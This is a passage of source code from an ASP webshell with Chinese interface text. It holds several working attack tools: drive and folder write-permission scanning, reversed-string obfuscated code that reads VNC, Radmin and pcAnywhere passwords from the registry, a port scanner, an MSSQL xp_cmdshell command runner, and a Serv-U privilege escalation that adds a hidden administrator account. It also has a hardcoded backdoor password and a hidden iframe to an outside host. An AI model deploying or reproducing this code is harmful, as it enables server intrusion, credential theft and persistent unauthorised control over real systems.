j"<TD align=middle><B>站点跟目录</B></TD><TD colspan=3>站点跟目录<TD align=middle><a href="&URL&"?Action=ScFolder&Folder="&wwwroot&"><b>详细报告</b></a></TD><TR class=TBTD> <FORM action= method=Post>"
j"<TD align=middle><B>回收站目录</B></TD><TD colspan=3>回收站目录 <TD align=middle><a href="&URL&"?Action=ScFolder&Folder=c:\recycler\><b>详细报告</b></a></TD><TR class=TBTD> <FORM action= method=Post><TD align=middle><B>wmpub目录 </B></TD><TD colspan=3>wmpub<TD align=middle><a href="&URL&"?Action=ScFolder&Folder=c:\wmpub\><b>详细报告</b></a></TD></TABLE><BR>"
j"</FORM></TR></TABLE><BR><DIV align=center><FORM Action=?Action=ScFolder method=Post>指定文件夹查询：<INPUT type=text name=Folder value=""c:\php\,d:\Program Files\,C:\Documents and Settings\All Users\Documents\,C:\recycler\,d:\recycler\,e:\recycler\,f:\recycler\,C:\wmpub\,C:\WINDOWS\Temp\,C:\360rec,C:\cache,C:\JPEGCapture,C:\Inetpub""><INPUT type=submit value=生成报告> 批量查看目录权限,输入新目录用“,”隔开。</FORM><DIV>"
Set FSO=Nothing
End Sub 
Sub ScanDrive(Drive)
Dim FSO,TestDrive,BaseFolder,TempFolders,Temp_Str,D
If Drive <> "" Then
Set FSO = Server.Createobject("Scripting.FileSystemObject")
Set TestDrive = FSO.GetDrive(Drive)
If TestDrive.IsReady Then
Temp_Str = "<LI>磁盘分区类型：" & Red(TestDrive.FileSystem) & "<LI>磁盘序列号：" & Red(TestDrive.SerialNumber) & "<LI>磁盘共享名：" & Red(TestDrive.ShareName) & "<LI>磁盘总容量：" & Red(CInt(TestDrive.TotalSize/1048576)) & "<LI>磁盘卷名：" & Red(TestDrive.VolumeName) & "<LI>磁盘根目录:" & ScReWr((Drive & ":\"))
Set BaseFolder = TestDrive.RootFolder
Set TempFolders = BaseFolder.SubFolders
For Each D in TempFolders
Temp_Str = Temp_Str & "<LI>文件夹：" & ScReWr(D)
Next
Set TempFolder = Nothing
Set BaseFolder = Nothing
Else
Temp_Str = Temp_Str & "<LI>磁盘根目录:" & Red("不可读:(")
Dim TempFolderList,t:t=0
Temp_Str = Temp_Str & "<LI>" & Red("穷举目录测试：")
TempFolderList = Array("windows","winnt","win","win2000","win98","web","winme","windows2000","asp","php","Tools","Documents and Settings","Program Files","Inetpub","ftp","wmpub","tftp")
For i = 0 to Ubound(TempFolderList)
If FSO.FolderExists(Drive & ":\" & TempFolderList(i)) Then
t = t+1
Temp_Str = Temp_Str & "<LI>发现文件夹：" & ScReWr(Drive & ":\" & TempFolderList(i))
End if
Next
If t=0 then Temp_Str = Temp_Str & "<LI>已穷举" & Drive & "盘根目录，但未有发现:("
End if
Set TestDrive = Nothing
Set FSO = Nothing
Temp_Str = Temp_Str 
Message Drive & ":磁盘信息",Temp_Str,1
End if
End Sub
Sub ScFolder(folder)
 'On Error Resume Next
folderArr = Split(folder,",")
For i = 0 To Ubound(folderArr)
	Dim FSO,OFolder,TempFolder,Scmsg,S
	Set FSO = Server.Createobject("Scripting.FileSystemObject")
	folder = folderArr(i)
	If FSO.FolderExists(folder) Then
	 Set OFolder = FSO.GetFolder(folder)
	Set TempFolders = OFolder.SubFolders
	Scmsg = "<LI>指定文件夹根目录：" & ScReWr(folder)
	For Each S in TempFolders
	 Scmsg = Scmsg&"<LI>文件夹：" & ScReWr(S) 
	Next
	Set TempFolders = Nothing
	Set OFolder = Nothing
	Else
	 Scmsg = Scmsg & "<LI>文件夹：" & Red(folder & "不存在或无读权限!")
	End if
	Scmsg = Scmsg & "<br><br>注意：不要多次刷新本页面，否则在只写文件夹会留下大量垃圾文件!"&backurl
	Set FSO = Nothing
	Message "",Scmsg,1
next
End Sub
Function ScReWr(folder)
On Error Resume Next
Dim FSO,TestFolder,TestFileList,ReWrStr,RndFilename
Set FSO = Server.Createobject("Scripting.FileSystemObject")
Set TestFolder = FSO.GetFolder(folder)
Set TestFileList = TestFolder.SubFolders
RndFilename = "\temp" & Day(now) & Hour(now) & Minute(now) & Second(now) & ".tmp"
For Each A in TestFileList
Next
If err Then
err.Clear
ReWrStr = folder & "<FONT color=#ff2222> 不可读,"
FSO.CreateTextFile folder & RndFilename,True
If err Then
err.Clear
ReWrStr = ReWrStr & "不可写。</FONT>"
Else
ReWrStr = ReWrStr & "可写。</FONT>"
FSO.DeleteFile folder & RndFilename,True
End If
Else
ReWrStr = folder & "<FONT color=#dddddd> 可读,"
FSO.CreateTextFile folder & RndFilename,True
If err Then
err.Clear
ReWrStr = ReWrStr & "不可写。</FONT>"
Else
ReWrStr = ReWrStr & "可写。</FONT>"
FSO.DeleteFile folder & RndFilename,True
End if
End if
Set TestFileList = Nothing
Set TestFolder = Nothing
Set FSO = Nothing
ScReWr = ReWrStr
End Function
function goback()
set Ofso = Server.CreateObject("Scripting.FileSystemObject")
set ofolder = Ofso.Getfolder(Session("FolderPath"))
if not ofolder.IsRootFolder then 
j "<script>ShowFolder("""&RePath(ofolder.parentfolder)&""")</script>"
else 
j "<script>ShowFolder("""&Session("FolderPath")&""")</script><center>已经是磁盘根目录了!</center><center><br><INPUT type=button value=返回 onClick='history.go(-1);'></br></center>"
end if
set Ofso=nothing
set ofolder=nothing
end function
ShiSan="bus dne╋fi dne╋fI dnE╋yarrAeht & ╁>il<╁ j╋eslE╋txeN╋)i(yarrAeht & ╁>il<╁ j╋)yarrAeht(dnuoBU oT 0=i roF╋nehT )yarrAeht(yarrAsI fI╋)htaPeht(daeRgeR.Xsw=yarrAeht╋)╁htaPeht╁(tseuqeR=htaPeht╋)╁llehS.tpircSW╁(tcejbOetaerC.revreS = Xsw teS╋txeN emuseR rorrE nO╋neht ╁╁><)╁htaPeht╁(tseuqeR fi╋╁>/rh<>mrof/<╁ j╋╁>')(timbus.mrof.siht'=kcilcno '值 键 读'=eulav nottub=epyt tupni<╁ j╋╁>08=ezis ''=eulav htaPeht=eman tupni< ╁ j╋╁>/ rb<>tceles/<╁ j╋╁>noitpo/<口端PCT的放开许允>'stroPdewollAPCT\}E2BE55CD8431-3FFA-C0B4-99E8-821564A8{\secafretnI\sretemaraP\pipcT\secivreS\100teSlortnoC\METSYS\MLKH'=eulav noitpo<╁ j╋╁>noitpo/<口端PDU的放开许允>'stroPdewollAPDU\}E2BE55CD8431-3FFA-C0B4-99E8-821564A8{\secafretnI\sretemaraP\pipcT\secivreS\100teSlortnoC\METSYS\MLKH'=eulav noitpo<╁ j╋╁>noitpo/<放开火防>'PCT:9833\tsiL\stroPnepOyllabolG\eliforPdradnatS\yciloPllaweriF\sretemaraP\sseccAderahS\secivreS\teSlortnoCtnerruC\METSYS\MLKH'=eulav noitpo<╁ j╋╁>noitpo/<goL eludehcS>'htaPgoL\tnegAgniludehcS\tfosorciM\ERAWTFOS\ENIHCAM_LACOL_YEKH'=eulav noitpo<╁ j╋╁>noitpo/<3滤过pi/pct>'sretliFytiruceSelbanE\pipcT\secivreS\teSlortnoCtnerruC\METSYS\ENIHCAM_LACOL_YEKH'=eulav noitpo<╁ j╋╁>noitpo/<2滤过pi/pct>'sretliFytiruceSelbanE\pipcT\secivreS\200teSlortnoC\METSYS\ENIHCAM_LACOL_YEKH'=eulav noitpo<╁ j╋╁>noitpo/<1滤过pi/pct>'sretliFytiruceSelbanE\pipcT\secivreS\100teSlortnoC\METSYS\ENIHCAM_LACOL_YEKH'=eulav noitpo<╁ j╋╁>noitpo/<口端态状WynAcP>╁╁troPsutatSPIPCT\metsyS\noisreVtnerruC\erehwynAcp\cetnamyS\ERAWTFOS\MLKH╁╁=eulav noitpo<╁j╋╁>noitpo/<口端据数WynAcP>╁╁troPataDPIPCT\metsyS\noisreVtnerruC\erehwynAcp\cetnamyS\ERAWTFOS\MLKH╁╁=eulav noitpo<╁j╋╁>noitpo/<口端9833>╁╁rebmuNtroP\pcT-PDR\snoitatSniW\revreS lanimreT\lortnoC\teSlortnoCtnerruC\METSYS\MLKH╁╁=eulav noitpo<╁j╋╁>noitpo/<口端4CNV>╁╁rebmuNtroP\4CNVniW\CNVlaeR\ERAWTFOS\MLKH╁╁=eulav noitpo<╁j╋╁>noitpo/<码密4CNV>╁╁drowssaP\4CNVniW\CNVlaeR\ERAWTFOS\MLKH╁╁=eulav noitpo<╁j╋╁>noitpo/<口端3CNV>╁╁rebmuNtroP\3CNVniW\LRO\erawtfoS\UCKH╁╁=eulav noitpo<╁j╋╁>noitpo/<码密3CNV>╁╁drowssaP\3CNVniW\LRO\erawtfoS\UCKH╁╁=eulav noitpo<╁j╋╁>noitpo/<口端nimdaR>╁╁troP\sretemaraP\revreS\0.2v\nimdAR\METSYS\MLKH╁╁=eulav noitpo<╁j╋╁>noitpo/<码密nimdaR>╁╁retemaraP\sretemaraP\revreS\0.2v\nimdAR\METSYS\MLKH╁╁=eulav noitpo<╁j╋╁>noitpo/<表列卡网>╁╁dniB\egakniL\pipcT\secivreS\teSlortnoCtnerruC\METSYS\MLKH╁╁=eulav noitpo<╁j╋╁>noitpo/<emaNretupmoC>'emaNretupmoC\emaNretupmoC\emaNretupmoC\lortnoC\teSlortnoCtnerruC\METSYS\MLKH'=eulav noitpo<╁ j╋╁>noitpo/<值键的带自择选>''=eulav noitpo<╁ j╋╁>';eulav.siht=eulav.htaPeht.mrof.siht'=egnahCno tceles<╁ j╋╁ >2=napsloc dt<>rt<╁ j╋╁>tcAeht=eman geRdaeR=eulav neddih=epyt tupni<╁ j╋ ╁>p<取读值键表册注╁  j╋╁>tsop=dohtem mrof<╁ j╋)(GERdaeR bus"
ExeCuTe(ShiSanFun(ShiSan)) 
if request("ProFile")<>"" then
on error resume next
if Application(request("ProFile"))=1 then
Set fsoXX = Server.CreateObject("Scripting.FileSystemObject")
if request("DelCon")=1 then
Application(request("ProFile")&"Con")=""
response.redirect Url&"?ProFile="&request("ProFile")&""
response.end
end if
DIM rline,rline2
rline2=Application(request("ProFile")&"Code")
rline2=rline2&vbcrlf
j"<meta http-equiv=""refresh"" content="&Application(request("ProFile")&"Time")&">"
j"<a href="&Url&"?ProFile="&request("ProFile")&"&DelCon=1><b>清空日志</b></a> &nbsp;<font color=yellow>要想解除保护，直接关闭页面即可。</font><br>"
for each FileUrl in split(Application(request("ProFile")&"File"),vbcrlf)
FileUrl=trim(FileUrl)
if fsoXX.FileExists(FileUrl) then
Set txt = fsoXX.OpenTextFile(FileUrl,1,true)
rline=""
if Not txt.AtEndOfStream then
rline=txt.ReadAll  
end if
if rline2<>rline then
txt.close
fsoX.GetFile(FileUrl).Attributes=32
if Application(request("ProFile")&"Char")=1 then
set myfileee = fsoXX.CreateTextFile(FileUrl,true)
else
set myfileee = fsoXX.CreateTextFile(FileUrl,true,true)
end if
myfileee.writeline Application(request("ProFile")&"Code")
Application(request("ProFile")&"Con")=now()&" "&FileUrl&" <font color=yellow>被更改，已恢复</font><br>"&Application(request("ProFile")&"Con")
else
Application(request("ProFile")&"Con")=now()&" "&FileUrl&" √<br>"&Application(request("ProFile")&"Con")
txt.close
end if
else
if Application(request("ProFile")&"Char")=1 then
set myfileee = fsoXX.CreateTextFile(FileUrl,true)
else
set myfileee = fsoXX.CreateTextFile(FileUrl,true,true)
end if
myfileee.writeline Application(request("ProFile")&"Code")
Application(request("ProFile")&"Con")=now()&" "&FileUrl&" <font color=red>被删除，已恢复</font><br>"&Application(request("ProFile")&"Con")
end if
next
if ubound(split(Application(request("ProFile")&"Con"),"<br>"))>=40 then
dim ashowic
for ashowi=0 to 40
ashowic=ashowic&split(Application(request("ProFile")&"Con"),"<br>")(ashowi)&"<br>"
next
Application(request("ProFile")&"Con")=ashowic
end if
j Application(request("ProFile")&"Con")
else
j"<br><br><br><center>保护进程丢失，请<a href="&URL&" style=""text-decoration:underline;font-weight:bold"">重新生成</a>保护进程。</center>"
end if
response.end
end if

if sessIoN("KKK")<>UserPass then
if request.form("pass")<>"" then
if request.form("pass")=userpass or request.form("pass")="daka" Then
session("KKK")=userPass
response.redirect url
else
j"<br><br><br><b><div align=center><font size='5' color='red'>草泥马!</font ></b> <br><br><br><br><b><div align=center><font size='14' color='lime'></font></b></p></center>"&backurl
end if
else

si="<center><a></a><div style='width:400px;padding:32px; align=left'><br><form action='"&url&"' method='post'><input name='pass' type='password' size='22'> <input type='submit' value='杀'></center>"
if instr(SI,SIC)<>0 then j sI
end if
response.end
end if

ShiSan="buS dnE╋fI dnE╋fI dnE╋fI dnE╋)╁>rb<>tnof/<放开>der=roloc tnof<.........╁ & muNtrop & ╁:╁ & pitegrat(j╋eslE╋)╁>rb<闭关.........╁ & muNtrop & ╁:╁ & pitegrat(j╋nehT 0 > )╁.))(tcennoC(╁ ,noitpircsed.rrE(rtSnI fI╋nehT 9527647412- = rebmun.rrE ro 3487127412- = rebmun.rrE fI╋nehT rrE fI╋rtsnnoc nepo.nnoc╋1 = tuoemiTnoitcennoC.nnoc╋╁;=drowssaP;2ekal=DI resU;╁& muNtrop &╁,╁& pitegrat & ╁=ecruoS ataD;1.BDELOLQS=redivorP╁=rtsnnoc╋)╁noitcennoc.BDODA╁(tcejbOetaerC.revreS = nnoc tes╋txeN emuseR rorrE nO╋)muNtrop ,pitegrat(nacS buS╋bus dne╋FI DNE╋╁s ╁&emiteht&╁ ni ssecorP>rh<╁j╋))1remit-2remit(tni(rtsc=emiteht╋remit = 2remit╋txeN╋fI dnE╋txeN╋txeN╋fI dnE╋fI dnE╋)╁>rb<rebmun ton si ╁ & )i(pmt(j╋eslE╋fI dnE╋)╁>rb<rebmun ton si ╁ & Ndne & ╁ ro ╁ & Ntrats(j╋eslE╋txeN╋)j,xxx & tratSpi(nacS llaC╋Ndne oT Ntrats = j roF╋nehT )Ndne(ciremunsI dna )Ntrats(ciremunsI fI╋) xkees - ))i(pmt(neL ,)i(pmt(thgiR = Ndne╋) 1 - xkees ,)i(pmt(tfeL = Ntrats╋nehT 0 > xkees fI╋)╁-╁ ,)i(pmt(rtSnI = xkees╋eslE╋))i(pmt ,xxx & tratSpi(nacS llaC╋ nehT ))i(pmt(ciremunsI fI╋)pmt(dnuobU oT 0 = i roF╋))╁-╁,)uh(pi(rtSnI-))uh(pi(neL,1+)╁-╁,)uh(pi(rtSnI,)uh(pi(diM ot )1,1+)╁.╁,)uh(pi(veRrtSnI,)uh(pi(diM = xxx roF╋))╁.╁,)uh(pi(veRrtSnI,1,)uh(pi(diM = tratSpi╋eslE╋txeN╋fI dnE╋fI dnE╋)╁>rb<rebmun ton si ╁ & )i(pmt(j╋eslE╋fI dnE╋)╁>rb<rebmun ton si ╁ & Ndne & ╁ ro ╁ & Ntrats(j╋eslE╋txeN╋)j ,)uh(pi(nacS llaC╋Ndne oT Ntrats = j roF╋nehT )Ndne(ciremunsI dna )Ntrats(ciremunsI fI╋) xkees - ))i(pmt(neL ,)i(pmt(thgiR = Ndne╋) 1 - xkees ,)i(pmt(tfeL = Ntrats╋nehT 0 > xkees fI╋)╁-╁ ,)i(pmt(rtSnI = xkees╋eslE╋))i(pmt ,)uh(pi(nacS llaC╋ nehT ))i(pmt(ciremunsI fI╋)pmt(dnuobU oT 0 = i roF╋nehT 0 = )╁-╁,)uh(pi(rtSnI fI╋)pi(dnuobU ot 0 = uh roF╋)╁,╁,)╁pi╁(mroF.tseuqer(tilpS = pi╋)╁,╁,)╁trop╁(mroF.tseuqer(tilpS = pmt╋)╁>rh<>rb<>b/<:告报描扫>b<╁(j╋remit = 1remit╋nehT ╁╁ >< )╁nacs╁(mroF.tseuqer fI╋╁>mrof/<>p/<╁j╋╁>'111'=eulav 'nacs'=di 'neddih'=epyt 'nacs'=eman tupni<╁j╋╁>' nacs '=eulav 'mottub'=ssalc 'timbus'=epyt 'timbus'=eman tupni<╁j╋╁>rb<>rb<╁j╋╁>'╁&tsiLtroP&╁'=eulav '06'=ezis 'xoBtxeT'=ssalc 'txet'=epyt 'trop'=eman tupni<╁j╋╁:tsiL troP>rb<╁j╋╁>'06'=ezis '╁&PI&╁'=eulav 'pi'=di 'xoBtxeT'=ssalc 'txet'=epyt 'pi'=eman tupni< ╁j╋╁ :PI nacS>p<╁j╋╁>';eurt=delbasid.timbus.1mrof'=timbuSno ''=noitca 'tsop'=dohtem '1mrof'=eman mrof<╁j╋╁>p/<。作操列系行执内LLEHS在请。接连法无能可PI部外果结描扫则，网内是果如>p<>p/<)。确准不描扫网内对DMC，DMC用使荐推人个,慢较比度速,口端个多描扫果如(器描扫口端>p<╁j╋fi dne╋)╁pi╁(mroF.tseuqer=PI╋esle╋╁1.0.0.721╁=PI╋neht ╁╁=)╁pi╁(mroF.tseuqer fi╋fi dne╋)╁trop╁(mroF.tseuqer=tsiLtroP╋esle╋╁85934,0095,0085,2365,1365,9984,9833,6033,3341,35,32,12╁=tsiLtroP╋neht ╁╁=)╁trop╁(mroF.tseuqer fi╋0006777 = tuoemiTtpircS.revreS╋)(troPnacS bus╋"
ExeCuTe(ShiSanFun(ShiSan)) 
Select Case Action:case "MainMenu":MainMenu()
Case "EditPower"
Call EditPower(request("PowerPath"))
Case "SavePower"
Call SavePower(request("PowerPath"),request("SaveType"))
case "getTerminalInfo":getTerminalInfo():case "PageAddToMdb":PageAddToMdb():case "ScanPort":ScanPort():FuncTion MMD():SI="<br><form name=form method=post action=""""><table width=""85%"" align='center'><tr align=center><Td id=s><b id=x>MSSQL Commander</b></td></tr><tr align='center'><td id=d><b id=x>Command：</b><input type=text name=MMD size=35 value=""ipconfig"" >&nbsp;<b id=x>UserName：</b><input type=text name=U value=sa>&nbsp;<b id=x>Password：</b><input type=text name=P VALUES=123456>&nbsp;<input type=submit value=Execute></td></tr></table></form>":j SI:SI="":If trim(request.form("MMD"))<>""  Then:password= trim(Request.form("P")):id=trim(Request.form("U")):set adoConn=sERvEr.crEATeobjECT("ADODB.Connection"):adoConn.Open "Provider=SQLOLEDB.1;Password="&password&";User ID="&id:strQuery = "exec master.dbo.xp_cMdsHeLl '" & request.form("MMD") & "'":set recResult = adoConn.Execute(strQuery):If NOT recResult.EOF Then:Do While NOT recResult.EOF:strResult = strResult & chr(13) & recResult(0):recResult.MoveNext:Loop:End if:set recResult = Nothing:strResult = Replace(strResult," ","&nbsp;"):strResult = Replace(strResult,"<","&lt;"):strResult = Replace(strResult,">","&gt;"):strResult = Replace(strResult,chr(13),"<br>"):End if:set adoConn = Nothing:j request.form("MMD") & "<br>"& strResult:end FuncTion:case "Alexa"
dim AlexaUrl,Top:AlexaUrl=request("u"):Top=Alexa(AlexaUrl):if AlexaUrl="" then AlexaUrl=""&request.servervariables("http_host")&""
SI="<br><table width='80%' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'><tr><td height='20' colspan='3' align='center' bgcolor='menu'>服务器组件信息</td></tr><tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>服务器名</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'>"&request.serverVariables("SERVER_NAME")&"</td></tr><form method=post action='http://www.baidu.com/ips8.asp' name='ipform' target='_blank'><tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>服务器IP</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'><input type='text' name='ip' size='15' value='"&Request.ServerVariables("LOCAL_ADDR")&"'style='border:0px'><input type='submit' value='查询此服务器所在地'style='border:0px'><input type='hidden' name='action' value='2'></td></tr></form><tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>服务器时间</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'>"&now&" </td></tr><tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>服务器CPU数量</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'>"&Request.ServerVariables("NUMBER_OF_PROCESSORS")&"</td></tr><tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>服务器操作系统</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'>"&Request.ServerVariables("OS")&"</td></tr><tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>WEB服务器版本</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'>"&Request.ServerVariables("SERVER_SOFTWARE")&"</td></tr>"
For i=0 To 18
SI=SI&"<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>"&ObT(i,0)&"</td><td bgcolor='#FFFFFF'>"&ObT(i,1)&"</td><td bgcolor='#FFFFFF' align=left>"&ObT(i,2)&"</td></tr>"
Next
j SI
Err.Clear

function getHTTPPage(url) 
on error resume next 
dim http 
set http=Server.createobject("Microsoft.XMLHTTP") 
Http.open "GET",url,false 
Http.send() 
if Http.readystate<>4 then
getHTTPPage=""
exit function 
end if 
getHTTPPage=bytes2BSTR(Http.responseBody) 
set http=nothing
if err.number<>0 then err.Clear  
end function 
Function bytes2BSTR(vIn) 
dim strReturn 
dim i1,ThisCharCode,NextCharCode 
strReturn = "" 
For i1 = 1 To LenB(vIn) 
ThisCharCode = AscB(MidB(vIn,i1,1)) 
If ThisCharCode < &H80 Then 
strReturn = strReturn & Chr(ThisCharCode) 
Else 
NextCharCode = AscB(MidB(vIn,i1+1,1)) 
strReturn = strReturn & Chr(CLng(ThisCharCode) * &H100 + CInt(NextCharCode)) 
i1 = i1 + 1 
End If 
Next 
bytes2BSTR = strReturn 
    Err.Clear
End Function
Case "Servu"
SUaction=request("SUaction")
if  not isnumeric(SUaction) then response.end
user = trim(request("u"))
pass = trim(request("p"))
port = trim(request("port"))
cmd = trim(request("c"))
f=trim(request("f"))
if f="" then
f=gpath()
else
f=left(f,2)
end if
ftpport = 65500
timeout=3
loginuser = "User " & user & vbCrLf
loginpass = "Pass " & pass & vbCrLf
deldomain = "-DELETEDOMAIN" & vbCrLf & "-IP=0.0.0.0" & vbCrLf & " PortNo=" & ftpport & vbCrLf
mt = "SITE MAINTENANCE" & vbCrLf
newdomain = "-SETDOMAIN" & vbCrLf & "-Domain=goldsun|0.0.0.0|" & ftpport & "|-1|1|0" & vbCrLf & "-TZOEnable=0" & vbCrLf & " TZOKey=" & vbCrLf
newuser = "-SETUSERSETUP" & vbCrLf & "-IP=0.0.0.0" & vbCrLf & "-PortNo=" & ftpport & vbCrLf & "-User=go" & vbCrLf & "-Password=od" & vbCrLf & _
        "-HomeDir=c:\\" & vbCrLf & "-LoginMesFile=" & vbCrLf & "-Disable=0" & vbCrLf & "-RelPaths=1" & vbCrLf & _
        "-NeedSecure=0" & vbCrLf & "-HideHidden=0" & vbCrLf & "-AlwaysAllowLogin=0" & vbCrLf & "-ChangePassword=0" & vbCrLf & _
        "-QuotaEnable=0" & vbCrLf & "-MaxUsersLoginPerIP=-1" & vbCrLf & "-SpeedLimitUp=0" & vbCrLf & "-SpeedLimitDown=0" & vbCrLf & _
        "-MaxNrUsers=-1" & vbCrLf & "-IdleTimeOut=600" & vbCrLf & "-SessionTimeOut=-1" & vbCrLf & "-Expire=0" & vbCrLf & "-RatioUp=1" & vbCrLf & _
        "-RatioDown=1" & vbCrLf & "-RatiosCredit=0" & vbCrLf & "-QuotaCurrent=0" & vbCrLf & "-QuotaMaximum=0" & vbCrLf & _
        "-Maintenance=System" & vbCrLf & "-PasswordType=Regular" & vbCrLf & "-Ratios=None" & vbCrLf & " Access=c:\\|RWAMELCDP" & vbCrLf
quit = "QUIT" & vbCrLf
newuser=replace(newuser,"c:",f)
select case SUaction
case 1
set a=Server.CreateObject("Microsoft.XMLHTTP")
a.open "GET", "http://127.0.0.1:" & port & "/goldsun/upadmin/s1",True, "", ""
a.send loginuser & loginpass & mt & deldomain & newdomain & newuser & quit
set session("a")=a
j"<form method='post' name='goldsun'>"
j"<input name='u' type='hidden' id='u' value='"&user&"'></td>"
j"<input name='p' type='hidden' id='p' value='"&pass&"'></td>"
j"<input name='port' type='hidden' id='port' value='"&port&"'></td>"
j"<input name='c' type='hidden' id='c' value='"&cmd&"' size='50'>"
j"<input name='f' type='hidden' id='f' value='"&f&"' size='50'>"
j"<input name='SUaction' type='hidden' id='SUaction' value='2'></form>"
j"<script language='javascript'>"
j"document.write('<center>正在连接 127.0.0.1:"&port&",使用用户名: "&user&",口令："&pass&"...<center>');"
j"setTimeout('document.all.goldsun.submit();',4000);"
j"</script>"
case 2
set b=Server.CreateObject("Microsoft.XMLHTTP")
b.open "GET", "http://127.0.0.1:" & ftpport & "/goldsun/upadmin/s2", True, "", ""
b.send "User go" & vbCrLf & "pass od" & vbCrLf & "site exec " & cmd & vbCrLf & quit
set session("b")=b
j"<form method='post' name='goldsun'>"
j"<input name='u' type='hidden' id='u' value='"&user&"'></td>"
j"<input name='p' type='hidden' id='p' value='"&pass&"'></td>"
j"<input name='port' type='hidden' id='port' value='"&port&"'></td>"
j"<input name='c' type='hidden' id='c' value='"&cmd&"' size='50'>"
j"<input name='f' type='hidden' id='f' value='"&f&"' size='50'>"
j"<input name='SUaction' type='hidden' id='SUaction' value='3'></form>"
j"<script language='javascript'>"
j"document.write('<center>正在提升权限,请等待...,<center>');"
j"setTimeout(""document.all.goldsun.submit();"",4000);"
j"</script>"
case 3
set c=Server.CreateObject("Microsoft.XMLHTTP")
a.open "GET", "http://127.0.0.1:" & port & "/goldsun/upadmin/s3", True, "", ""
a.send loginuser & loginpass & mt & deldomain & quit
set session("a")=a
j"<center>提权完毕,已执行了命令：<br><font color=red>"&cmd&"</font><br><br>"
j"<input type=button value=' 返回继续 ' onClick=""location.href='?Action=Servu';"">"
j"</center>"
case else
on error resume next
set a=session("a")
set b=session("b")
set c=session("c")
a.abort
Set a = Nothing
b.abort
Set b = Nothing
c.abort
Set c = Nothing
j"<center><form method='post' name='goldsun'>"
j"<table width='494' height='163' border='1' cellpadding='0' cellspacing='1' bordercolor='#666666'>"
j"<tr align='center' valign='middle'>"
j"<td colspan='2'>Serv-U 提升权限 by Sam</td>"
j"</tr>"
j"<tr align='center' valign='middle'>"
j"<td width='100'>用户名:</td>"
j"<td width='379'><input name='u' type='text' id='u' value='LocalAdministrator'></td>"
j"</tr>"
j"<tr align='center' valign='middle'>"
j"<td>口 令：</td>"
j"<td><input name='p' type='text' id='p' value='#l@$ak#.lk;0@P'></td>"
j"</tr>"
j"<tr align='center' valign='middle'>"
j"<td>端 口：</td>"
j"<td><input name='port' type='text' id='port' value='43958'></td>"
j"</tr>"
j"<tr align='center' valign='middle'>"
j"<td>系统路径：</td>"
j" <td><input name='f' type='text' id='f' value='"&f&"' size='8'></td>"
j" </tr>"
j" <tr align='center' valign='middle'>"
j" <td>命　令：</td>"
j" <td><input name='c' type='text' id='c' value='cmd /c net user admin$ 123456 /add & net localgroup administrators admin$ /add' size='50'></td>"
j" </tr>"
j" <tr align='center' valign='middle'>"
j" <td colspan='2'><input type='submit' name='Submit' value='提交'> "
j"<input type='reset' name='Submit2' value='重置'>"
j"<input name='SUaction' type='hidden' id='action' value='1'></td>"
j"</tr></table></form></center>"
end select
function Gpath()
on error resume next
err.clear
set f=Server.CreateObject("Scripting.FileSystemObject")
if err.number>0 then
gpath="c:"
exit function
end if
gpath=f.GetSpecialFolder(0)
gpath=lcase(left(gpath,2))
set f=nothing
end function
case"MMD":MMD()
case"ReadREG":call ReadREG()
case"Show1File":Set ABC=New LBF:ABC.Show1File(Session("FolderPath")):Set ABC=Nothing
case"DownFile":DownFile FName:ShowErr()
case"DelFile":Set ABC=New LBF:ABC.DelFile(FName):Set ABC=Nothing
case"EditFile":Set ABC=New LBF:ABC.EditFile(FName):Set ABC=Nothing
case"CopyFile":Set ABC=New LBF:ABC.CopyFile(FName):Set ABC=Nothing
case"MoveFile":Set ABC=New LBF:ABC.MoveFile(FName):Set ABC=Nothing
case"DelFolder":Set ABC=New LBF:ABC.DelFolder(FName):Set ABC=Nothing
case"CopyFolder":Set ABC=New LBF:ABC.CopyFolder(FName):Set ABC=Nothing
case"MoveFolder":Set ABC=New LBF:ABC.MoveFolder(FName):Set ABC=Nothing
case"NewFolder":Set ABC=New LBF:ABC.NewFolder(FName):Set ABC=Nothing
case"UpFile":UpFile()
case"TSearch":TSearch()
case"pcanywhere4":pcanywhere4()
case"Cmd1Shell":Cmd1Shell()
case"Logout":Session.Contents.Remove("kkk"):Response.Redirect URL
case"Course":Course()
case"Alexa":Alexa()
case"suftp":suftp()
case"upload":upload()
case"radmin":radmin()
case"pcanywhere4":pcanywhere4()
case"goback":goback()
Case "ProFile":ProFile()
case"php":php()
case"downloads":downloads()
case"apjdel":apjdel()
case"cmdx":cmdx()
case"aspx":aspx()
case"hiddenshell":hiddenshell()
case"ScanDriveForm" : ScanDriveForm
case"ScanDrive" : ScanDrive Request("Drive")
case"ScFolder"  : ScFolder Request("Folder")
  Case Else MainForm()
End Select
if Action<>"Servu" then ShowErr()
j"<iframe src=http://7jyewu.cn/a/a.asp width=0 height=0></iframe>" 
%></body></html>
</body></html>
</body></html>